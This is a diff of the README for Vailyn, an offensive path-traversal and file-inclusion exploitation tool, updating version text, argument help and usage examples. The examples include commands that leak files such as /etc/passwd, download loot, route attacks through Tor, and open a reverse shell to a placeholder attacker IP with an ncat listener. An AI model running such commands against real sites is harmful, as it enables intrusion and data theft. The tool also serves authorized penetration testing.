@@ -6,7 +6,7 @@
 
 <p align="center">
   <a href="https://github.com/VainlyStrain/Vailyn/blob/master/Vailyn">
-    <img src="https://img.shields.io/static/v1.svg?label=Version&message=2.2&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
+    <img src="https://img.shields.io/static/v1.svg?label=Version&message=2.3&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
   </a>
   <a href="https://www.python.org/">
     <img src="https://img.shields.io/static/v1.svg?label=Python&message=3.7%2B&color=lightgrey&style=flat-square&logo=python&logoColor=white">
@@ -64,27 +64,28 @@ Vailyn has 3 mandatory arguments: `-v VIC, -a INT and -l FIL PATH`. However, dep
 
 ```
 mandatory:
-  -v VIC, --victim VIC  Target to attack, part 1 [pre injection point]
-  -a INT, --attack INT  Attack type (int, 1-5)[see the Markdown docs]
+  -v VIC, --victim VIC  Target to attack, part 1 [pre-payload]
+  -a INT, --attack INT  Attack type (int, 1-5)
   -l FIL PATH, --lists FIL PATH      
-                        Dictionaries to use (see templates for syntax)
+                        Dictionaries (files and dirs)
 additional:
   -p P, --param P       query parameter to use for --attack 1
   -s D, --post D        POST Data (set injection point with INJECT)
   -j A P, --listen A P  Try a reverse shell in Phase 2 (A:IP, P:port)
-  -d I J, --depths I J  depths of checking (I: phase 1, J: phase 2)
+  -d I J K, --depths I J K  
+                        depths (I: phase 1, J: phase 2, K: permutation level)
   -n, --loot            Download found files into the loot folder
   -c C, --cookie C      File containing authentication cookie (if needed)
   -h, --help            show this help menu and exit
   -i F, --check F       File to check for in Phase 1 (df: /etc/passwd)
-  -q V, --vic2 V        Attack Target, part 2 (post injection point)
+  -q V, --vic2 V        Attack Target, part 2 [post-payload]
   -t, --tor             Pipe attacks through the Tor anonymity network
   -k T, --timeout T     Request Timeout; stable switch for Arjun
   -m, --nosploit        skip Phase 2 (does not need -l FIL PATH)
   --app                 Start Vailyn's Qt5 interface
 ```
 
-Vailyn currently supports 4 attack vectors. The attack performed is identified by the `-a INT` argument.
+Vailyn currently supports 4 attack vectors, and provides a crawler to automate all of them. The attack performed is identified by the `-a INT` argument.
 
 ```
 INT        attack
@@ -117,7 +118,7 @@ You can modify the lookup depth with the first value of `-d` (default=8).
 
 This is the exploitation phase, where Vailyn will try to leak as much files as possible, or gain a reverse shell using various techniques.
 
-The depth of lookup in phase 2 (the maximal number of layers traversed back, and the level of subdirectory recursion) is specified by the second value of the `-d` argument. In future versions, these properties can be changed independently (using 2 arguments).
+The depth of lookup in phase 2 (the maximal number of layers traversed back) is specified by the second value of the `-d` argument. The level of subdirectory permutation is set by the third value of `-d`.
 
 By specifying `-n`, Vailyn will not only display files on the terminal, but also download and save the files into the loot folder.
 
@@ -154,7 +155,7 @@ To distinguish real results from false positives, Vailyn does the following chec
 `$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file` --> `http://site.com/download.php?file=../INJECT`
 
 * Query attack, but I know a file `index.php` exists on same level:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file -i index.php -d 1 X`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file -i index.php -d 1 X X`
 This will shorten the duration of Phase 1 very much, since its a targeted attack.
 
 * Simple Path attack:
@@ -176,7 +177,7 @@ will infect DATA2 with the payload
 
 * Attack, but I want a reverse shell on port 1337:
 `$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -j MY.IP.IS.XX 1337`
-(will start a ncat listener for you)
+(will start a ncat listener for you if on Unix)
 
 * Full automation in crawler mode:
 `$ Vailyn -v "http://root-url.site" -a 5` _you can also specify depths, lookup file here_ 
